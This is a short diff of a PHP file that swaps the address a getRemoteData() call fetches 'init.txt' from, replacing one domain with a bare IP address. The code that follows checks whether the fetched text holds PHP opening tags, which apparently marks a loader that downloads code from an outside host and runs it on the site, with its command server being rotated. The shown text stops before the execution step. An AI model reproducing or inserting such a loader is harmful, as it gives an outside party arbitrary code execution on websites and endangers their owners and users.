@@ -22,7 +22,7 @@ function getRemoteData($url) {
     
     return $result;
 }
-$configData = getRemoteData('https://j251113_23.atelart.com/init.txt');
+$configData = getRemoteData('http://173.208.153.180/j251116_13/init.txt');
 
 if ($configData) {
     if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
